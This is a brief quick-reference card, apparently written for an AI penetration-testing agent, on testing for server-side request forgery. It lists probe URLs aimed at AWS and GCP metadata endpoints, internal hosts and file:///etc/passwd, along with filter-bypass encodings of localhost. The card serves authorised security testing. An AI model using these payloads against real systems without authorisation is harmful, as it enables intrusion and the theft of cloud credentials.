# SSRF Skill — Quick Reference Card

> Read this first. Load `SKILL.md` only if you need full technique detail.

## Workflow (3 Phases)
```
Phase 1: Probe for URL-accepting params
Phase 2: Detect blind vs reflected SSRF
Phase 3: Internal network enumeration (one hop only)
```

## Detection Probes (in order)
1. Burp Collaborator OOB → `http://burp-collaborator.net/test`
2. Internal host → `http://169.254.169.254/latest/meta-data/` (AWS)
3. Internal host → `http://metadata.google.internal/` (GCP)
4. Internal network → `http://192.168.1.1/`
5. File protocol → `file:///etc/passwd`

## URL Bypass Variants
- `http://[::1]/` — IPv6 localhost
- `http://0177.0000.0000.0001/` — octal localhost
- `http://0x7f000001/` — hex localhost
- `http://foo.evil.com@127.0.0.1/` — @ bypass

## Stop Signals
- URL validated by allowlist → check DNS rebinding potential
- No OOB response + no error delta → may be async (wait for Collaborator)

## Result Format
```
Status: confirmed | negative | partial
Evidence: Collaborator DNS hit OR internal service response
```

> **Full skill:** `cat skills/ssrf/SKILL.md`
